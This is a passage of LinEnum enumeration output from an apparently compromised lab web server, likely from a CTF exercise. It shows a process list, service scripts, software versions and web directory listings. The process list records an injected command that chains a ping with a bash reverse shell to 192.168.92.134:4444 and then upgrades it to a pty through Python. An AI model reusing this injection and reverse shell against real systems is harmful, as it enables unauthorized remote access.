+apache   10641  0.0  4.9 22508 6268 ?        S    00:49   0:00 httpd
+apache   10678  0.0  5.0 22508 6328 ?        S    00:50   0:00 httpd
+apache   10682  0.0  4.9 22508 6280 ?        S    00:50   0:00 httpd
+apache   10685  0.0  4.9 22508 6268 ?        S    00:50   0:00 httpd
+apache   10693  0.0  4.6 22376 5816 ?        S    00:50   0:00 httpd
+apache   10711  0.0  5.0 22508 6300 ?        S    00:50   0:00 httpd
+apache   10719  0.0  5.0 22508 6352 ?        S    00:50   0:00 httpd
+apache   10720  0.0  5.0 22508 6328 ?        S    00:50   0:00 httpd
+apache   10726  0.0  5.0 22508 6308 ?        S    00:50   0:00 httpd
+apache   10745  0.0  4.1 22376 5236 ?        S    00:50   0:00 httpd
+apache   10751  0.0  5.0 22508 6352 ?        S    00:51   0:00 httpd
+apache   10755  0.0  5.0 22508 6340 ?        S    00:51   0:00 httpd
+apache   10762  0.0  4.9 22508 6296 ?        S    00:51   0:00 httpd
+apache   10763  0.0  5.0 22512 6344 ?        S    00:51   0:00 httpd
+apache   10780  0.0  5.0 22508 6336 ?        S    00:51   0:00 httpd
+apache   10801  0.0  5.0 22508 6348 ?        S    00:51   0:00 httpd
+apache   10811  0.0  4.6 22376 5808 ?        S    00:51   0:00 httpd
+apache   10847  0.0  4.9 22508 6296 ?        S    00:51   0:00 httpd
+apache   10862  0.0  4.9 22508 6296 ?        S    00:52   0:00 httpd
+apache   11028  0.0  0.8  5424 1128 ?        S    01:59   0:00 sh -c ping -c 3 192.168.92.134;bash -i >& /dev/tcp/192.168.92.134/4444 0>&1
+apache   11030  0.0  1.0  5216 1304 ?        S    01:59   0:00 bash -i
+apache   11096  0.0  0.8  2156 1012 ?        S    02:18   0:00 //bin/sh
+apache   11099  0.0  1.6  3544 2116 ?        S    02:19   0:00 python -c import pty; pty.spawn("/bin/bash")
+apache   11100  0.0  0.9  2160 1144 pts/0    Ss   02:19   0:00 /bin/bash
+apache   11106  0.0  1.0  2416 1332 pts/0    S+   02:21   0:00 /bin/bash ./LinEnum.sh -t
+apache   11107  0.0  0.7  2444  916 pts/0    R+   02:21   0:00 /bin/bash ./LinEnum.sh -t
+apache   11109  0.0  0.2  1460  340 pts/0    S+   02:21   0:00 tee -a
+apache   11409  0.0  0.6  2444  852 pts/0    S+   02:22   0:00 /bin/bash ./LinEnum.sh -t
+apache   11410  0.0  0.6  2316  784 pts/0    R+   02:22   0:00 ps aux
+
+
+[-] Process binaries and associated permissions (from above list):
+lrwxrwxrwx  1 root root       4 Oct  7  2009 //bin/sh -> bash
+-rwxr-xr-x  1 root root  616248 Aug 13  2006 /bin/bash
+lrwxrwxrwx  1 root root       4 Oct  7  2009 /bin/sh -> bash
+-rwxr-xr-x  1 root root   12772 Feb 21  2005 /sbin/mingetty
+-rwxr-xr-x  1 root root 6036288 Jul 25  2008 /usr/libexec/mysqld
+-rwxr-x---  1 root root   22540 Feb 21  2005 /usr/sbin/acpid
+-rwxr-xr-x  1 root root   19544 Apr 26  2006 /usr/sbin/atd
+-rwxr-xr-x  1 root root  313008 May  2  2007 /usr/sbin/sshd
+
+
+[-] Contents of /etc/xinetd.conf:
+#
+# Simple configuration file for xinetd
+#
+# Some defaults, and include /etc/xinetd.d/
+
+defaults
+{
+	instances               = 60
+        log_type                = SYSLOG authpriv
+        log_on_success		= HOST PID
+        log_on_failure		= HOST
+	cps			= 25 30
+}
+
+includedir /etc/xinetd.d
+
+
+[-] /etc/xinetd.d is included in /etc/xinetd.conf - associated binary permissions are listed below:
+total 144
+drwxr-xr-x   2 root root  4096 Oct  7  2009 .
+drwxr-xr-x  80 root root 12288 Jan 25 23:45 ..
+-rw-r--r--   1 root root   563 Aug 21  2005 chargen
+-rw-r--r--   1 root root   580 Aug 21  2005 chargen-udp
+-rwxr-xr-x   1 root root   239 May  3  2007 cups-lpd
+-rw-r--r--   1 root root   419 Aug 21  2005 daytime
+-rw-r--r--   1 root root   438 Aug 21  2005 daytime-udp
+-rw-r--r--   1 root root   341 Aug 21  2005 echo
+-rw-r--r--   1 root root   360 Aug 21  2005 echo-udp
+-rw-r--r--   1 root root   323 May  3  2007 eklogin
+-rw-r--r--   1 root root   326 May  3  2007 gssftp
+-rw-r--r--   1 root root   310 May  3  2007 klogin
+-rw-r--r--   1 root root   323 May  3  2007 krb5-telnet
+-rw-r--r--   1 root root   308 May  3  2007 kshell
+-rw-r--r--   1 root root   317 Feb 21  2005 rsync
+-rw-r--r--   1 root root   497 Aug 21  2005 time
+-rw-r--r--   1 root root   518 Aug 21  2005 time-udp
+
+
+[-] /etc/init.d/ binary permissions:
+lrwxrwxrwx  1 root root 11 Oct  7  2009 /etc/init.d -> rc.d/init.d
+
+
+[-] /etc/rc.d/init.d binary permissions:
+total 712
+drwxr-xr-x   2 root root     4096 Oct  8  2009 .
+drwxr-xr-x  10 root root     4096 Oct  7  2009 ..
+-rwxr-xr-x   1 root root     1454 May  3  2007 NetworkManager
+-rwxr-xr-x   1 root root     1128 Feb 21  2005 acpid
+-rwxr-xr-x   1 root root      834 Feb 21  2005 anacron
+-rwxr-xr-x   1 root root     1429 Feb 21  2005 apmd
+-rwxr-xr-x   1 root root     4404 Feb 21  2005 arptables_jf
+-rwxr-xr-x   1 root root     1176 Apr 26  2006 atd
+-rwxr-xr-x   1 root root     2781 May  2  2007 auditd
+-rwxr-xr-x   1 root root    16544 May  3  2007 autofs
+-rwxr-xr-x   1 root root     1368 Feb 21  2005 bluetooth
+-rwxr-xr-x   1 root root     1355 May  2  2007 cpuspeed
+-rwxr-xr-x   1 root root     1904 Jul 12  2006 crond
+-rwxr-xr-x   1 root root     2312 May  3  2007 cups
+-rwxr-xr-x   1 root root     1502 Feb 21  2005 dc_client
+-rwxr-xr-x   1 root root     1344 Feb 21  2005 dc_server
+-rwxr-xr-x   1 root root    16898 May  2  2007 diskdump
+-rwxr-xr-x   1 root root      968 Feb 21  2005 dund
+-rwxr-xr-x   1 root root    10799 Nov 20  2006 functions
+-rwxr-xr-x   1 root root     1778 May 17  2006 gpm
+-rwxr-xr-x   1 root root     1388 May  2  2007 haldaemon
+-rwxr-xr-x   1 root root     6028 Jan 15  2007 halt
+-rwxr-xr-x   1 root root     1001 Feb 21  2005 hidd
+-rwxr-xr-x   1 root root     3201 May  4  2007 httpd
+-rwxr-xr-x   1 root root    13763 May  3  2007 ipmi
+-rwxr-xr-x   1 root root     7135 Feb 21  2005 iptables
+-rwxr-xr-x   1 root root     1487 Feb 21  2005 irda
+-rwxr-xr-x   1 root root     1949 May  2  2007 irqbalance
+-rwxr-xr-x   1 root root     6183 Feb 21  2005 isdn
+-rwxr-xr-x   1 root root      200 Sep 27  2006 keytable
+-rwxr-xr-x   1 root root      652 Sep  3  2003 killall
+-rwxr-xr-x   1 root root     2095 May  2  2007 kudzu
+-rwxr-xr-x   1 root root     1906 May  5  2007 lvm2-monitor
+-rwxr-xr-x   1 root root     1700 May  3  2007 mdmonitor
+-rwxr-xr-x   1 root root     1613 May  3  2007 mdmpd
+-rwxr-xr-x   1 root root     1746 May  3  2007 messagebus
+-rwxr-xr-x   1 root root     1731 May  2  2007 microcode_ctl
+-rwxr-xr-x   1 root root     4235 Jul 25  2008 mysqld
+-rwxr-xr-x   1 root root    12198 May  2  2007 netdump
+-rwxr-xr-x   1 root root     7422 Nov 20  2006 netfs
+-rwxr-xr-x   1 root root     1303 May  2  2007 netplugd
+-rwxr-xr-x   1 root root     8543 Apr 18  2006 network
+-rwxr-xr-x   1 root root     4344 May  3  2007 nfs
+-rwxr-xr-x   1 root root     3274 May  3  2007 nfslock
+-rwxr-xr-x   1 root root     2171 May  2  2007 nscd
+-rwxr-xr-x   1 root root     3586 May  5  2007 ntpd
+-rwxr-xr-x   1 root root    17713 May  3  2007 openibd
+-rwxr-xr-x   1 root root     1144 Feb 21  2005 pand
+-rwxr-xr-x   1 root root     4431 Mar  8  2006 pcmcia
+-rwxr-xr-x   1 root root     1877 Feb 21  2005 portmap
+-rwxr-xr-x   1 root root     1021 Jan 17  2007 psacct
+-rwxr-xr-x   1 root root     2404 Oct 18  2004 rawdevices
+-rwxr-xr-x   1 root root     1387 May  2  2007 rdisc
+-rwxr-xr-x   1 root root      790 May  2  2007 readahead
+-rwxr-xr-x   1 root root      795 May  2  2007 readahead_early
+-rwxr-xr-x   1 root root     1777 May  3  2007 rhnsd
+-rwxr-xr-x   1 root root     2177 May  3  2007 rpcgssd
+-rwxr-xr-x   1 root root     1805 May  3  2007 rpcidmapd
+-rwxr-xr-x   1 root root     2153 May  3  2007 rpcsvcgssd
+-rwxr-xr-x   1 root root     1547 Feb 21  2005 saslauthd
+-rwxr-xr-x   1 root root     3349 May  2  2007 sendmail
+-rwxr-xr-x   1 root root     1175 Jul 10  2002 single
+-rwxr-xr-x   1 root root     2247 May  2  2007 smartd
+-rwxr-xr-x   1 root root     3282 May  4  2007 squid
+-rwxr-xr-x   1 root root     3105 May  2  2007 sshd
+-rwxr-xr-x   1 root root     1369 Feb 21  2005 syslog
+-rwxr-x---   1 root pegasus  2321 Aug 12  2006 tog-pegasus
+-rwxr-xr-x   1 root root     2796 Feb 21  2005 tux
+-rwxr-xr-x   1 root root     1880 Aug 12  2006 vsftpd
+-rwxr-xr-x   1 root root     1548 Feb 15  2007 winbind
+-rwxr-xr-x   1 root root     1650 May  2  2007 wpa_supplicant
+-rwxr-xr-x   1 root root     3607 May  3  2007 xfs
+-rwxr-xr-x   1 root root     2497 Aug 21  2005 xinetd
+-rwxr-xr-x   1 root root     2822 May  2  2007 ypbind
+-rwxr-xr-x   1 root root     1036 May  5  2007 yum
+
+
+### SOFTWARE #############################################
+[-] Sudo version:
+Sudo version 1.6.7p5
+
+
+[-] MYSQL version:
+mysql  Ver 14.7 Distrib 4.1.22, for redhat-linux-gnu (i686) using readline 4.3
+
+
+[-] www home dir contents:
+/var/www/:
+total 64K
+drwxr-xr-x   8 root      root 4.0K Oct  7  2009 .
+drwxr-xr-x  21 root      root 4.0K Oct  7  2009 ..
+drwxr-xr-x   2 root      root 4.0K May  4  2007 cgi-bin
+drwxr-xr-x   3 root      root 4.0K Oct  7  2009 error
+drwxr-xr-x   2 root      root 4.0K Oct  8  2009 html
+drwxr-xr-x   3 root      root 4.0K Oct  8  2009 icons
+drwxr-xr-x  13 root      root 4.0K Oct  7  2009 manual
+drwxr-xr-x   2 webalizer root 4.0K Oct  9  2009 usage
+
+/var/www/cgi-bin:
+total 16K
+drwxr-xr-x  2 root root 4.0K May  4  2007 .
+drwxr-xr-x  8 root root 4.0K Oct  7  2009 ..
+
+/var/www/error:
+total 288K
+drwxr-xr-x  3 root root 4.0K Oct  7  2009 .
+drwxr-xr-x  8 root root 4.0K Oct  7  2009 ..
+-rw-r--r--  1 root root 7.2K Apr 19  2004 HTTP_BAD_GATEWAY.html.var
+-rw-r--r--  1 root root 5.2K Apr 19  2004 HTTP_BAD_REQUEST.html.var
+-rw-r--r--  1 root root 8.8K Apr 19  2004 HTTP_FORBIDDEN.html.var
+-rw-r--r--  1 root root  11K Apr 19  2004 HTTP_GONE.html.var
+-rw-r--r--  1 root root  11K Apr 19  2004 HTTP_INTERNAL_SERVER_ERROR.html.var
+-rw-r--r--  1 root root 6.0K Apr 19  2004 HTTP_LENGTH_REQUIRED.html.var
+-rw-r--r--  1 root root 5.4K Apr 19  2004 HTTP_METHOD_NOT_ALLOWED.html.var
+-rw-r--r--  1 root root 5.5K Apr 19  2004 HTTP_NOT_ACCEPTABLE.html.var
+-rw-r--r--  1 root root  11K Apr 19  2004 HTTP_NOT_FOUND.html.var
+-rw-r--r--  1 root root 5.0K Apr 19  2004 HTTP_NOT_IMPLEMENTED.html.var
+-rw-r--r--  1 root root 5.3K Apr 19  2004 HTTP_PRECONDITION_FAILED.html.var
+-rw-r--r--  1 root root 6.2K Apr 19  2004 HTTP_REQUEST_ENTITY_TOO_LARGE.html.var
+-rw-r--r--  1 root root 5.7K Apr 19  2004 HTTP_REQUEST_TIME_OUT.html.var
+-rw-r--r--  1 root root 5.7K Apr 19  2004 HTTP_REQUEST_URI_TOO_LARGE.html.var
+-rw-r--r--  1 root root 6.2K Apr 19  2004 HTTP_SERVICE_UNAVAILABLE.html.var
+-rw-r--r--  1 root root  11K Apr 19  2004 HTTP_UNAUTHORIZED.html.var
+-rw-r--r--  1 root root 5.1K Apr 19  2004 HTTP_UNSUPPORTED_MEDIA_TYPE.html.var
+-rw-r--r--  1 root root 5.6K Apr 19  2004 HTTP_VARIANT_ALSO_VARIES.html.var
+-rw-r--r--  1 root root 1.9K Feb 16  2004 README
+-rw-r--r--  1 root root 3.4K Feb 16  2004 contact.html.var
+drwxr-xr-x  2 root root 4.0K Oct  7  2009 include
+-rw-r--r--  1 root root 5.0K May  4  2007 noindex.html
+
+/var/www/error/include:
+total 40K
+drwxr-xr-x  2 root root 4.0K Oct  7  2009 .
+drwxr-xr-x  3 root root 4.0K Oct  7  2009 ..
+-rw-r--r--  1 root root  291 May  4  2007 bottom.html
+-rw-r--r--  1 root root    9 Nov 27  2002 spacer.html
+-rw-r--r--  1 root root  969 Apr 19  2004 top.html
+
+/var/www/html:
+total 24K
+drwxr-xr-x  2 root root 4.0K Oct  8  2009 .
+drwxr-xr-x  8 root root 4.0K Oct  7  2009 ..
+-rwxr-Sr-t  1 root root 1.7K Feb  9  2012 index.php
+-rwxr-Sr-t  1 root root  199 Oct  8  2009 pingit.php
+
+/var/www/icons:
+total 1.3M
+drwxr-xr-x  3 root root 4.0K Oct  8  2009 .
+drwxr-xr-x  8 root root 4.0K Oct  7  2009 ..
+-rw-r--r--  1 root root 4.8K Oct  9  2003 README
+-rw-r--r--  1 root root  246 Aug 24  1999 a.gif
+-rw-r--r--  1 root root  293 May 30  2001 a.png
+-rw-r--r--  1 root root  242 Aug 24  1999 alert.black.gif
+-rw-r--r--  1 root root  279 May 30  2001 alert.black.png
+-rw-r--r--  1 root root  247 Aug 24  1999 alert.red.gif
+-rw-r--r--  1 root root  298 May 30  2001 alert.red.png
+-rw-r--r--  1 root root 2.3K Aug 24  1999 apache_pb.gif
+-rw-r--r--  1 root root 1.4K May 30  2001 apache_pb.png
+-rw-r--r--  1 root root 2.4K May  3  2001 apache_pb2.gif
+-rw-r--r--  1 root root 1.5K May 30  2001 apache_pb2.png
+-rw-r--r--  1 root root 2.2K May  3  2001 apache_pb2_ani.gif
+-rw-r--r--  1 root root  216 Aug 24  1999 back.gif
+-rw-r--r--  1 root root  284 May 30  2001 back.png
+-rw-r--r--  1 root root  233 Aug 24  1999 ball.gray.gif
+-rw-r--r--  1 root root  277 May 30  2001 ball.gray.png
+-rw-r--r--  1 root root  205 Aug 24  1999 ball.red.gif
+-rw-r--r--  1 root root  265 May 30  2001 ball.red.png
+-rw-r--r--  1 root root  246 Aug 24  1999 binary.gif
+-rw-r--r--  1 root root  296 May 30  2001 binary.png
+-rw-r--r--  1 root root  246 Aug 24  1999 binhex.gif
+-rw-r--r--  1 root root  304 May 30  2001 binhex.png
+-rw-r--r--  1 root root  148 Aug 24  1999 blank.gif
+-rw-r--r--  1 root root  195 May 30  2001 blank.png
+-rw-r--r--  1 root root  308 Aug 24  1999 bomb.gif
+-rw-r--r--  1 root root  356 May 30  2001 bomb.png
+-rw-r--r--  1 root root  251 Aug 24  1999 box1.gif
+-rw-r--r--  1 root root  308 May 30  2001 box1.png
+-rw-r--r--  1 root root  268 Aug 24  1999 box2.gif
+-rw-r--r--  1 root root  322 May 30  2001 box2.png
+-rw-r--r--  1 root root  247 Aug 24  1999 broken.gif
+-rw-r--r--  1 root root  305 May 30  2001 broken.png
+-rw-r--r--  1 root root  235 Aug 24  1999 burst.gif
+-rw-r--r--  1 root root  314 May 30  2001 burst.png
+-rw-r--r--  1 root root  242 Aug 24  1999 c.gif
+-rw-r--r--  1 root root  285 May 30  2001 c.png
+-rw-r--r--  1 root root  251 Aug 24  1999 comp.blue.gif
+-rw-r--r--  1 root root  313 May 30  2001 comp.blue.png
+-rw-r--r--  1 root root  246 Aug 24  1999 comp.gray.gif
+-rw-r--r--  1 root root  304 May 30  2001 comp.gray.png
+-rw-r--r--  1 root root 1.1K Aug 24  1999 compressed.gif
+-rw-r--r--  1 root root  315 May 30  2001 compressed.png
+-rw-r--r--  1 root root  214 Aug 24  1999 continued.gif
+-rw-r--r--  1 root root  272 May 30  2001 continued.png
+-rw-r--r--  1 root root  225 Aug 24  1999 dir.gif
+-rw-r--r--  1 root root  272 May 30  2001 dir.png
+-rw-r--r--  1 root root  167 May 21  2002 diskimg.gif
+-rw-r--r--  1 root root  202 May 21  2002 diskimg.png
+-rw-r--r--  1 root root  163 Aug 24  1999 down.gif
+-rw-r--r--  1 root root  232 May 30  2001 down.png
+-rw-r--r--  1 root root  238 Aug 24  1999 dvi.gif
+-rw-r--r--  1 root root  290 May 30  2001 dvi.png
+-rw-r--r--  1 root root  236 Aug 24  1999 f.gif
+-rw-r--r--  1 root root  282 May 30  2001 f.png
+-rw-r--r--  1 root root  225 Aug 24  1999 folder.gif
+-rw-r--r--  1 root root  242 Aug 24  1999 folder.open.gif
+-rw-r--r--  1 root root  305 May 30  2001 folder.open.png
+-rw-r--r--  1 root root  272 May 30  2001 folder.png
+-rw-r--r--  1 root root  243 Aug 24  1999 folder.sec.gif
+-rw-r--r--  1 root root  290 May 30  2001 folder.sec.png
+-rw-r--r--  1 root root  219 Aug 24  1999 forward.gif
+-rw-r--r--  1 root root  284 May 30  2001 forward.png
+-rw-r--r--  1 root root  221 Aug 24  1999 generic.gif
+-rw-r--r--  1 root root  260 May 30  2001 generic.png
+-rw-r--r--  1 root root  220 Aug 24  1999 generic.red.gif
+-rw-r--r--  1 root root  262 May 30  2001 generic.red.png
+-rw-r--r--  1 root root  249 Aug 24  1999 generic.sec.gif
+-rw-r--r--  1 root root  279 May 30  2001 generic.sec.png
+-rw-r--r--  1 root root  217 Aug 24  1999 hand.right.gif
+-rw-r--r--  1 root root  280 May 30  2001 hand.right.png
+-rw-r--r--  1 root root  223 Aug 24  1999 hand.up.gif
+-rw-r--r--  1 root root  280 May 30  2001 hand.up.png
+-rw-r--r--  1 root root  12K Aug 24  1999 icon.sheet.gif
+-rw-r--r--  1 root root 8.7K May 30  2001 icon.sheet.png
+-rw-r--r--  1 root root  274 Aug 24  1999 image1.gif
+-rw-r--r--  1 root root  307 May 30  2001 image1.png
+-rw-r--r--  1 root root  309 Aug 24  1999 image2.gif
+-rw-r--r--  1 root root  355 May 30  2001 image2.png
+-rw-r--r--  1 root root  286 Aug 24  1999 image3.gif
+-rw-r--r--  1 root root  323 May 30  2001 image3.png
+-rw-r--r--  1 root root  268 Aug 24  1999 index.gif
+-rw-r--r--  1 root root  316 May 30  2001 index.png
+-rw-r--r--  1 root root  276 Aug 24  1999 layout.gif
+-rw-r--r--  1 root root  306 May 30  2001 layout.png
+-rw-r--r--  1 root root  172 Aug 24  1999 left.gif
+-rw-r--r--  1 root root  235 May 30  2001 left.png
+-rw-r--r--  1 root root  249 Aug 24  1999 link.gif
+-rw-r--r--  1 root root  297 May 30  2001 link.png
+-rw-r--r--  1 root root  243 Aug 24  1999 movie.gif
+-rw-r--r--  1 root root  258 May 30  2001 movie.png
+-rw-r--r--  1 root root  237 Aug 24  1999 p.gif
+-rw-r--r--  1 root root  284 May 30  2001 p.png
+-rw-r--r--  1 root root  251 Aug 24  1999 patch.gif
+-rw-r--r--  1 root root  295 May 30  2001 patch.png
+-rw-r--r--  1 root root  249 Aug 24  1999 pdf.gif
+-rw-r--r--  1 root root  289 May 30  2001 pdf.png
+-rw-r--r--  1 root root 3.8K Jun  1  2009 php.gif
+-rw-r--r--  1 root root  188 Aug 24  1999 pie0.gif
+-rw-r--r--  1 root root  242 May 30  2001 pie0.png
+-rw-r--r--  1 root root  198 Aug 24  1999 pie1.gif
+-rw-r--r--  1 root root  261 May 30  2001 pie1.png
+-rw-r--r--  1 root root  198 Aug 24  1999 pie2.gif
+-rw-r--r--  1 root root  253 May 30  2001 pie2.png
+-rw-r--r--  1 root root  191 Aug 24  1999 pie3.gif
+-rw-r--r--  1 root root  256 May 30  2001 pie3.png
+-rw-r--r--  1 root root  193 Aug 24  1999 pie4.gif
+-rw-r--r--  1 root root  239 May 30  2001 pie4.png
+-rw-r--r--  1 root root  189 Aug 24  1999 pie5.gif
+-rw-r--r--  1 root root  258 May 30  2001 pie5.png
+-rw-r--r--  1 root root  186 Aug 24  1999 pie6.gif
+-rw-r--r--  1 root root  253 May 30  2001 pie6.png
+-rw-r--r--  1 root root  185 Aug 24  1999 pie7.gif
+-rw-r--r--  1 root root  258 May 30  2001 pie7.png
+-rw-r--r--  1 root root  173 Aug 24  1999 pie8.gif
+-rw-r--r--  1 root root  233 May 30  2001 pie8.png
+-rw-r--r--  1 root root  254 Aug 24  1999 portal.gif
+-rw-r--r--  1 root root  303 May 30  2001 portal.png
+-rw-r--r--  1 root root  244 Aug 24  1999 ps.gif
+-rw-r--r--  1 root root  287 May 30  2001 ps.png
+-rw-r--r--  1 root root  267 Aug 24  1999 quill.gif
+-rw-r--r--  1 root root  315 May 30  2001 quill.png
+-rw-r--r--  1 root root  172 Aug 24  1999 right.gif
+-rw-r--r--  1 root root  233 May 30  2001 right.png
+-rw-r--r--  1 root root  258 Aug 24  1999 screw1.gif
+-rw-r--r--  1 root root  312 May 30  2001 screw1.png
+-rw-r--r--  1 root root  263 Aug 24  1999 screw2.gif
+-rw-r--r--  1 root root  318 May 30  2001 screw2.png
+-rw-r--r--  1 root root  242 Aug 24  1999 script.gif
+-rw-r--r--  1 root root  275 May 30  2001 script.png
+drwxr-xr-x  2 root root 4.0K Oct  7  2009 small
+-rw-r--r--  1 root root  248 Aug 24  1999 sound1.gif
+-rw-r--r--  1 root root  310 May 30  2001 sound1.png
+-rw-r--r--  1 root root  221 Aug 24  1999 sound2.gif
+-rw-r--r--  1 root root  297 May 30  2001 sound2.png
+-rw-r--r--  1 root root  285 Aug 24  1999 sphere1.gif
+-rw-r--r--  1 root root  326 May 30  2001 sphere1.png
+-rw-r--r--  1 root root  264 Aug 24  1999 sphere2.gif
+-rw-r--r--  1 root root  322 May 30  2001 sphere2.png
+-rw-r--r--  1 root root  219 Aug 24  1999 tar.gif
+-rw-r--r--  1 root root  261 May 30  2001 tar.png
+-rw-r--r--  1 root root  251 Aug 24  1999 tex.gif
+-rw-r--r--  1 root root  295 May 30  2001 tex.png
+-rw-r--r--  1 root root  229 Aug 24  1999 text.gif
+-rw-r--r--  1 root root  273 May 30  2001 text.png
+-rw-r--r--  1 root root  242 Aug 24  1999 transfer.gif
+-rw-r--r--  1 root root  319 May 30  2001 transfer.png
+-rw-r--r--  1 root root  245 Aug 24  1999 unknown.gif
+-rw-r--r--  1 root root  291 May 30  2001 unknown.png
+-rw-r--r--  1 root root  164 Aug 24  1999 up.gif
+-rw-r--r--  1 root root  234 May 30  2001 up.png
+-rw-r--r--  1 root root  236 Aug 24  1999 uu.gif
+-rw-r--r--  1 root root  280 May 30  2001 uu.png
+-rw-r--r--  1 root root  236 Aug 24  1999 uuencoded.gif
+-rw-r--r--  1 root root  280 May 30  2001 uuencoded.png
+-rw-r--r--  1 root root  228 Aug 24  1999 world1.gif
+-rw-r--r--  1 root root  315 May 30  2001 world1.png
+-rw-r--r--  1 root root  261 Aug 24  1999 world2.gif
+-rw-r--r--  1 root root  339 May 30  2001 world2.png
+
+/var/www/icons/small:
+total 536K
+drwxr-xr-x  2 root root 4.0K Oct  7  2009 .
+drwxr-xr-x  3 root root 4.0K Oct  8  2009 ..
+-rw-r--r--  1 root root  300 Aug 24  1999 README.txt
+-rw-r--r--  1 root root  129 Aug 24  1999 back.gif
+-rw-r--r--  1 root root  238 May 30  2001 back.png
+-rw-r--r--  1 root root  134 Aug 24  1999 binary.gif
+-rw-r--r--  1 root root  242 May 30  2001 binary.png
+-rw-r--r--  1 root root  131 Aug 24  1999 binhex.gif
+-rw-r--r--  1 root root  248 May 30  2001 binhex.png
+-rw-r--r--  1 root root   55 Aug 24  1999 blank.gif
+-rw-r--r--  1 root root   90 May 30  2001 blank.png
+-rw-r--r--  1 root root  139 Aug 24  1999 broken.gif
+-rw-r--r--  1 root root  254 May 30  2001 broken.png
+-rw-r--r--  1 root root  128 Aug 24  1999 burst.gif
+-rw-r--r--  1 root root  194 May 30  2001 burst.png
+-rw-r--r--  1 root root  130 Aug 24  1999 comp1.gif
+-rw-r--r--  1 root root  197 May 30  2001 comp1.png
+-rw-r--r--  1 root root  131 Aug 24  1999 comp2.gif
+-rw-r--r--  1 root root  194 May 30  2001 comp2.png
+-rw-r--r--  1 root root  128 Aug 24  1999 compressed.gif
+-rw-r--r--  1 root root  189 May 30  2001 compressed.png
+-rw-r--r--  1 root root  114 Aug 24  1999 continued.gif
+-rw-r--r--  1 root root  214 May 30  2001 continued.png
+-rw-r--r--  1 root root  132 Aug 24  1999 dir.gif
+-rw-r--r--  1 root root  175 May 30  2001 dir.png
+-rw-r--r--  1 root root  122 Aug 24  1999 dir2.gif
+-rw-r--r--  1 root root  161 May 30  2001 dir2.png
+-rw-r--r--  1 root root  191 Aug 24  1999 doc.gif
+-rw-r--r--  1 root root  269 May 30  2001 doc.png
+-rw-r--r--  1 root root  125 Aug 24  1999 forward.gif
+-rw-r--r--  1 root root  244 May 30  2001 forward.png
+-rw-r--r--  1 root root  116 Aug 24  1999 generic.gif
+-rw-r--r--  1 root root  182 May 30  2001 generic.png
+-rw-r--r--  1 root root  127 Aug 24  1999 generic2.gif
+-rw-r--r--  1 root root  158 May 30  2001 generic2.png
+-rw-r--r--  1 root root  113 Aug 24  1999 generic3.gif
+-rw-r--r--  1 root root  147 May 30  2001 generic3.png
+-rw-r--r--  1 root root  126 Aug 24  1999 image.gif
+-rw-r--r--  1 root root  178 May 30  2001 image.png
+-rw-r--r--  1 root root  138 Aug 24  1999 image2.gif
+-rw-r--r--  1 root root  186 May 30  2001 image2.png
+-rw-r--r--  1 root root  145 Aug 24  1999 index.gif
+-rw-r--r--  1 root root  206 May 30  2001 index.png
+-rw-r--r--  1 root root  187 Aug 24  1999 key.gif
+-rw-r--r--  1 root root  254 May 30  2001 key.png
+-rw-r--r--  1 root root  134 Aug 24  1999 movie.gif
+-rw-r--r--  1 root root  202 May 30  2001 movie.png
+-rw-r--r--  1 root root  182 Aug 24  1999 patch.gif
+-rw-r--r--  1 root root  250 May 30  2001 patch.png
+-rw-r--r--  1 root root  184 Aug 24  1999 ps.gif
+-rw-r--r--  1 root root  254 May 30  2001 ps.png
+-rw-r--r--  1 root root 3.8K Aug 24  1999 rainbow.gif
+-rw-r--r--  1 root root 2.4K May 30  2001 rainbow.png
+-rw-r--r--  1 root root  130 Aug 24  1999 sound.gif
+-rw-r--r--  1 root root  176 May 30  2001 sound.png
+-rw-r--r--  1 root root  119 Aug 24  1999 sound2.gif
+-rw-r--r--  1 root root  236 May 30  2001 sound2.png
+-rw-r--r--  1 root root  132 Aug 24  1999 tar.gif
+-rw-r--r--  1 root root  227 May 30  2001 tar.png
+-rw-r--r--  1 root root  128 Aug 24  1999 text.gif
+-rw-r--r--  1 root root  202 May 30  2001 text.png
+-rw-r--r--  1 root root  124 Aug 24  1999 transfer.gif
+-rw-r--r--  1 root root  186 May 30  2001 transfer.png
+-rw-r--r--  1 root root  131 Aug 24  1999 unknown.gif
+-rw-r--r--  1 root root  226 May 30  2001 unknown.png
+-rw-r--r--  1 root root  125 Aug 24  1999 uu.gif
+-rw-r--r--  1 root root  217 May 30  2001 uu.png
+
+/var/www/manual:
+total 2.3M
+drwxr-xr-x  13 root root 4.0K Oct  7  2009 .
+drwxr-xr-x   8 root root 4.0K Oct  7  2009 ..
+-rw-r--r--   1 root root  12K Feb  8  2004 LICENSE
+-rw-r--r--   1 root root  257 Jul 29  2004 bind.html
+-rw-r--r--   1 root root 9.4K Feb 20  2004 bind.html.en
+-rw-r--r--   1 root root 9.9K Jul 29  2004 bind.html.ja.euc-jp
+-rw-r--r--   1 root root 8.3K May  7  2004 bind.html.ko.euc-kr
+-rw-r--r--   1 root root  278 Jul 29  2004 configuring.html
+-rw-r--r--   1 root root  13K Sep  4  2004 configuring.html.en
+-rw-r--r--   1 root root  12K Jul 29  2004 configuring.html.ja.euc-jp
+-rw-r--r--   1 root root  11K Feb 20  2004 configuring.html.ko.euc-kr
+-rw-r--r--   1 root root  302 Jul 29  2004 content-negotiation.html
+-rw-r--r--   1 root root  31K Mar 15  2004 content-negotiation.html.en
+-rw-r--r--   1 root root  31K Sep  4  2004 content-negotiation.html.ja.euc-jp
+-rw-r--r--   1 root root  26K May  7  2004 content-negotiation.html.ko.euc-kr
+-rw-r--r--   1 root root  281 Jul 29  2004 custom-error.html
+-rw-r--r--   1 root root 9.5K Feb 20  2004 custom-error.html.en
+-rw-r--r--   1 root root 9.1K Jul 29  2004 custom-error.html.ja.euc-jp
+-rw-r--r--   1 root root 8.7K May  7  2004 custom-error.html.ko.euc-kr
+drwxr-xr-x   2 root root 4.0K Oct  7  2009 developer
+-rw-r--r--   1 root root  278 Jul 29  2004 dns-caveats.html
+-rw-r--r--   1 root root  13K Feb 20  2004 dns-caveats.html.en
+-rw-r--r--   1 root root  13K Jul 29  2004 dns-caveats.html.ja.euc-jp
+-rw-r--r--   1 root root  11K May  7  2004 dns-caveats.html.ko.euc-kr
+-rw-r--r--   1 root root  254 Jul 29  2004 dso.html
+-rw-r--r--   1 root root  17K Feb 20  2004 dso.html.en
+-rw-r--r--   1 root root  17K Sep  9  2004 dso.html.ja.euc-jp
+-rw-r--r--   1 root root  14K May  7  2004 dso.html.ko.euc-kr
+-rw-r--r--   1 root root  254 Jul 29  2004 env.html
